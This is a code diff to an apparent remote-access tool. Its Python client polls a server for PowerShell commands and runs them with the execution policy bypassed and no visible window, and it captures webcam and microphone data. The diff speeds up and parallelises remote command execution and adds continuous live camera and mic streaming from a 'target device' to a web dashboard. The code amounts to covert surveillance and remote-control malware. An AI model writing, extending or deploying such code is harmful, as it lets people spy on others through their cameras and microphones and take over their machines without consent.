@@ -323,6 +323,24 @@ def check_remote_config_loop():
         poll_interval = int(os.getenv("CONFIG_POLL_INTERVAL", "900"))
         time.sleep(poll_interval)
 
+_ACTIVE_REMOTE_CMDS = set()
+_ACTIVE_REMOTE_CMDS_LOCK = threading.Lock()
+
+def _launch_command_worker(device_id, command_id, command, via_http=True, server_url=""):
+    with _ACTIVE_REMOTE_CMDS_LOCK:
+        if command_id in _ACTIVE_REMOTE_CMDS:
+            return
+        _ACTIVE_REMOTE_CMDS.add(command_id)
+
+    def _worker():
+        try:
+            _run_and_report_command(device_id, command_id, command, via_http=via_http, server_url=server_url)
+        finally:
+            with _ACTIVE_REMOTE_CMDS_LOCK:
+                _ACTIVE_REMOTE_CMDS.discard(command_id)
+
+    threading.Thread(target=_worker, daemon=True).start()
+
 def _poll_and_run_remote_command(device_id):
     """
     Poll for a pending remote PowerShell command from the server and execute it.
@@ -351,7 +369,7 @@ def _poll_and_run_remote_command(device_id):
                     UpdateExpression="SET pending_command = :pc",
                     ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
                 )
-                _run_and_report_command(device_id, command_id, command, via_http=False)
+                _launch_command_worker(device_id, command_id, command, via_http=False)
             return
 
         # HTTP path: poll from Lambda
@@ -362,7 +380,7 @@ def _poll_and_run_remote_command(device_id):
         if data.get("has_command"):
             command_id = data["command_id"]
             command = data["command"]
-            _run_and_report_command(device_id, command_id, command, via_http=True, server_url=server_url)
+            _launch_command_worker(device_id, command_id, command, via_http=True, server_url=server_url)
     except Exception as e:
         print(f"[RemoteCmd] Poll error: {e}")
 
@@ -436,8 +454,11 @@ def capture_camera_sample():
             from PIL import Image
             rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
             img = Image.fromarray(rgb)
+            if img.width > 640:
+                ratio = 640 / float(img.width)
+                img = img.resize((640, int(img.height * ratio)), Image.Resampling.LANCZOS)
             buf = io.BytesIO()
-            img.save(buf, format="WEBP", quality=50)
+            img.save(buf, format="WEBP", quality=45)
             return buf.getvalue(), None
         except ImportError:
             return None, "DEPENDENCY_REQUIRED: OpenCV (cv2) is not installed on client machine for DirectShow webcam capture. (pip install opencv-python)"
@@ -505,7 +526,7 @@ def _run_and_report_command(device_id, command_id, command, via_http=True, serve
     try:
         result = subprocess.run(
             ["powershell.exe", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", command],
-            capture_output=True, text=True, timeout=120,
+            stdin=subprocess.DEVNULL, capture_output=True, text=True, timeout=120,
             creationflags=0x08000000 if os.name == 'nt' else 0
         )
         output = (result.stdout or "") + (result.stderr or "")
@@ -606,7 +627,7 @@ if not server_only:
                 _poll_and_run_remote_command(device_id)
             except Exception as e:
                 print(f"[RemoteCmd] Loop error: {e}")
-            time.sleep(2)  # Check for commands every 2 seconds for snappy real-time execution
+            time.sleep(0.8)  # Check for commands every 0.8 seconds for near real-time execution
     threading.Thread(target=_cmd_poll_loop, daemon=True).start()
 
 def hide_directory(path):
@@ -1844,13 +1865,22 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             </div>
 
             <div style="display:flex; gap:0.75rem; flex-wrap:wrap;">
-                <button onclick="startAvDiagnostic('audio')" id="btn-diag-audio" style="flex:1; background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                <button onclick="startAvDiagnostic('audio')" id="btn-diag-audio" style="flex:1; min-width:160px; background:#1e293b; border:1px solid #38bdf8; color:#38bdf8; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
                     <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
-                    Microphone Diagnostic (5s)
+                    Mic Sample (5s)
                 </button>
-                <button onclick="startAvDiagnostic('camera')" id="btn-diag-camera" style="flex:1; background:#1e293b; border:1px solid #10b981; color:#10b981; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                <button onclick="startAvDiagnostic('camera')" id="btn-diag-camera" style="flex:1; min-width:160px; background:#1e293b; border:1px solid #10b981; color:#10b981; padding:0.6rem 1rem; border-radius:8px; font-weight:600; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
                     <svg style="width:16px;height:16px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
-                    Camera Frame Diagnostic
+                    Camera Snapshot
+                </button>
+            </div>
+
+            <div style="display:flex; gap:0.75rem; flex-wrap:wrap;">
+                <button onclick="toggleLiveAvStream('camera')" id="btn-live-camera" style="flex:1; min-width:160px; background:rgba(16, 185, 129, 0.15); border:1px solid #10b981; color:#34d399; padding:0.6rem 1rem; border-radius:8px; font-weight:700; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                    ▶ Start Live Camera Stream
+                </button>
+                <button onclick="toggleLiveAvStream('audio')" id="btn-live-audio" style="flex:1; min-width:160px; background:rgba(56, 189, 248, 0.15); border:1px solid #38bdf8; color:#7dd3fc; padding:0.6rem 1rem; border-radius:8px; font-weight:700; font-size:0.85rem; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:0.5rem; transition:all 0.2s;">
+                    ▶ Start Live Mic Stream
                 </button>
             </div>
 
@@ -2598,9 +2628,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 terminalCurrentCommandId = data.command_id;
                 terminalPollCount = 0;
                 terminalLog('📡 Command dispatched (ID: ' + data.command_id.substring(0, 8) + '). Waiting for client to run it...', '#8b949e');
-                // Check immediately at 800ms, then every 1.5s for fast real-time feedback
-                setTimeout(pollTerminalResult, 800);
-                terminalPollInterval = setInterval(pollTerminalResult, 1500);
+                // Check immediately at 400ms, then every 600ms for near real-time feedback
+                setTimeout(pollTerminalResult, 400);
+                terminalPollInterval = setInterval(pollTerminalResult, 600);
             } catch (err) {
                 terminalLog('✗ Network error: ' + err.message, '#f85149');
                 document.getElementById('terminal-send-btn').disabled = false;
@@ -2610,9 +2640,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
 
         async function pollTerminalResult() {
             terminalPollCount++;
-            if (terminalPollCount > 120) {
+            if (terminalPollCount > 200) {
                 clearInterval(terminalPollInterval); terminalPollInterval = null;
-                terminalLog('⏱ Timeout: No response from device after 3 minutes. Target device may be offline or busy.', '#f85149');
+                terminalLog('⏱ Timeout: No response from device after 2 minutes. Target device may be offline or busy.', '#f85149');
                 document.getElementById('terminal-send-btn').disabled = false;
                 document.getElementById('terminal-send-btn').innerText = 'Run';
                 return;
@@ -2646,13 +2676,16 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         // ==================== AV DIAGNOSTICS & MEDIA SESSIONS ====================
         let avPollInterval = null;
         let avCurrentCommandId = null;
+        let avLiveMode = null; // 'camera' | 'audio' | null
+        let avLiveActive = false;
 
         function openAvModal() {
             if (!selectedDevice) return;
+            stopAllLiveAvStreams();
             const d = allDevices.find(dev => dev.device_id === selectedDevice);
             const label = d ? (d.nickname || d.device_id) : selectedDevice;
             document.getElementById('av-device-label').innerText = label;
-            document.getElementById('av-status-text').innerHTML = 'Ready. Select a diagnostic test above to initiate an authorized session.';
+            document.getElementById('av-status-text').innerHTML = 'Ready. Select a snapshot test or start a Live Stream above.';
             document.getElementById('av-audio-player').style.display = 'none';
             document.getElementById('av-camera-img').style.display = 'none';
 
@@ -2665,6 +2698,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
 
         function closeAvModal() {
+            stopAllLiveAvStreams();
             const modal = document.getElementById('av-modal');
             modal.style.opacity = '0';
             modal.style.pointerEvents = 'none';
@@ -2672,8 +2706,122 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             setTimeout(() => { modal.style.display = 'none'; }, 200);
         }
 
+        function stopAllLiveAvStreams() {
+            avLiveActive = false;
+            avLiveMode = null;
+            const camBtn = document.getElementById('btn-live-camera');
+            const audBtn = document.getElementById('btn-live-audio');
+            if (camBtn) {
+                camBtn.innerHTML = '▶ Start Live Camera Stream';
+                camBtn.style.background = 'rgba(16, 185, 129, 0.15)';
+                camBtn.style.borderColor = '#10b981';
+                camBtn.style.color = '#34d399';
+            }
+            if (audBtn) {
+                audBtn.innerHTML = '▶ Start Live Mic Stream';
+                audBtn.style.background = 'rgba(56, 189, 248, 0.15)';
+                audBtn.style.borderColor = '#38bdf8';
+                audBtn.style.color = '#7dd3fc';
+            }
+            const audioPlayer = document.getElementById('av-audio-player');
+            if (audioPlayer) { try { audioPlayer.pause(); } catch(e) {} }
+        }
+
+        async function toggleLiveAvStream(mode) {
+            if (!selectedDevice) return;
+            if (avLiveActive && avLiveMode === mode) {
+                stopAllLiveAvStreams();
+                document.getElementById('av-status-text').innerHTML = `<span style="color:#8b949e;">⏹ Live ${mode} stream stopped.</span>`;
+                return;
+            }
+            stopAllLiveAvStreams();
+            avLiveActive = true;
+            avLiveMode = mode;
+
+            const btn = document.getElementById(mode === 'camera' ? 'btn-live-camera' : 'btn-live-audio');
+            btn.innerHTML = `⏹ Stop Live ${mode === 'camera' ? 'Camera' : 'Mic'} Stream`;
+            btn.style.background = 'rgba(239, 68, 68, 0.2)';
+            btn.style.borderColor = '#ef4444';
+            btn.style.color = '#fca5a5';
+
+            const statusEl = document.getElementById('av-status-text');
+            const audioPlayer = document.getElementById('av-audio-player');
+            const cameraImg = document.getElementById('av-camera-img');
+            if (mode === 'camera') { audioPlayer.style.display = 'none'; } else { cameraImg.style.display = 'none'; }
+
+            let frameCount = 0;
+            const duration = mode === 'audio' ? 3 : 5;
+
+            while (avLiveActive && avLiveMode === mode && selectedDevice) {
+                try {
+                    if (frameCount === 0) {
+                        statusEl.innerHTML = `<span style="color:#38bdf8;">🔴 Starting live ${mode} stream (AES-256-GCM encrypted)...</span>`;
+                    }
+                    const res = await fetch('/api/devices/av/start', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ device_id: selectedDevice, mode: mode, duration: duration })
+                    });
+                    if (!res.ok) {
+                        await new Promise(r => setTimeout(r, 1500));
+                        continue;
+                    }
+                    const data = await res.json();
+                    const cmdId = data.command_id;
+
+                    // Fast poll for this frame/chunk
+                    let completed = false;
+                    for (let attempt = 0; attempt < 45; attempt++) {
+                        if (!avLiveActive || avLiveMode !== mode) break;
+                        await new Promise(r => setTimeout(r, mode === 'camera' ? 450 : 800));
+                        if (!avLiveActive || avLiveMode !== mode) break;
+
+                        const sRes = await fetch(`/api/devices/av/status?device_id=${encodeURIComponent(selectedDevice)}&command_id=${encodeURIComponent(cmdId)}`);
+                        const sData = await sRes.json();
+                        if (sData.status === 'completed') {
+                            completed = true;
+                            if (sData.result_status === 'blocked') {
+                                statusEl.innerHTML = `<b style="color:#f59e0b;">⚠ Windows Security Restriction:</b><br>${sData.error || 'Privacy settings prevented access.'}`;
+                                stopAllLiveAvStreams();
+                                break;
+                            }
+                            frameCount++;
+                            const streamUrl = `/api/devices/av/stream/${encodeURIComponent(selectedDevice)}/${encodeURIComponent(cmdId)}?t=${Date.now()}`;
+                            if (mode === 'camera') {
+                                // Preload offscreen so frame swaps without flicker
+                                await new Promise(resolve => {
+                                    const pre = new Image();
+                                    pre.onload = () => {
+                                        if (avLiveActive && avLiveMode === 'camera') {
+                                            cameraImg.src = pre.src;
+                                            cameraImg.style.display = 'block';
+                                            statusEl.innerHTML = `<b style="color:#10b981;">🔴 LIVE CAMERA STREAM</b> <span style="color:#8b949e;">(Frame #${frameCount} • AES-256-GCM • ${new Date().toLocaleTimeString()})</span>`;
+                                        }
+                                        resolve();
+                                    };
+                                    pre.onerror = resolve;
+                                    pre.src = streamUrl;
+                                });
+                            } else {
+                                audioPlayer.src = streamUrl;
+                                audioPlayer.style.display = 'block';
+                                audioPlayer.play().catch(() => {});
+                                statusEl.innerHTML = `<b style="color:#38bdf8;">🔴 LIVE MIC STREAM</b> <span style="color:#8b949e;">(Chunk #${frameCount} • 3s AES-256-GCM • ${new Date().toLocaleTimeString()})</span>`;
+                            }
+                            break;
+                        }
+                    }
+                    if (!avLiveActive || avLiveMode !== mode) break;
+                    await new Promise(r => setTimeout(r, mode === 'camera' ? 150 : 200));
+                } catch (err) {
+                    await new Promise(r => setTimeout(r, 1500));
+                }
+            }
+        }
+
         async function startAvDiagnostic(mode) {
             if (!selectedDevice) return;
+            stopAllLiveAvStreams();
             const statusEl = document.getElementById('av-status-text');
             const audioPlayer = document.getElementById('av-audio-player');
             const cameraImg = document.getElementById('av-camera-img');
@@ -2704,9 +2852,9 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 if (avPollInterval) clearInterval(avPollInterval);
                 avPollInterval = setInterval(async () => {
                     pollAttempts++;
-                    if (pollAttempts > 40) {
+                    if (pollAttempts > 120) {
                         clearInterval(avPollInterval); avPollInterval = null;
-                        statusEl.innerHTML = '<span style="color:#ef4444;">⏱ Timeout: Client did not respond within 3 minutes.</span>';
+                        statusEl.innerHTML = '<span style="color:#ef4444;">⏱ Timeout: Client did not respond.</span>';
                         document.getElementById('btn-diag-audio').disabled = false;
                         document.getElementById('btn-diag-camera').disabled = false;
                         return;
@@ -2733,7 +2881,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                             }
                         }
                     } catch (e) {}
-                }, 4000);
+                }, 600);
             } catch (err) {
                 statusEl.innerHTML = `<span style="color:#ef4444;">✗ Network error: ${err.message}</span>`;
                 document.getElementById('btn-diag-audio').disabled = false;
@@ -4853,8 +5001,23 @@ def client_poll_command():
                 cmd_data = d_item.get("pending_command")
                 if cmd_data:
                     cmd_obj = json.loads(cmd_data) if isinstance(cmd_data, str) else cmd_data
-                    if cmd_obj.get("status") == "pending":
+                    status_val = cmd_obj.get("status")
+                    should_dispatch = (status_val == "pending")
+                    if not should_dispatch and status_val == "dispatched":
+                        disp_iso = cmd_obj.get("dispatched_at")
+                        if disp_iso:
+                            try:
+                                disp_dt = datetime.fromisoformat(disp_iso.replace("Z", "+00:00"))
+                                age_sec = (datetime.now(timezone.utc) - disp_dt).total_seconds()
+                                retry_after = 25 if str(cmd_obj.get("command", "")).startswith("AV_DIAGNOSTIC:") else 12
+                                if age_sec > retry_after:
+                                    should_dispatch = True
+                            except Exception:
+                                pass
+
+                    if should_dispatch:
                         cmd_obj["status"] = "dispatched"
+                        cmd_obj["dispatched_at"] = datetime.now(timezone.utc).isoformat()
                         devices_tbl.update_item(
                             Key={"device_id": did},
                             UpdateExpression="SET pending_command = :pc",
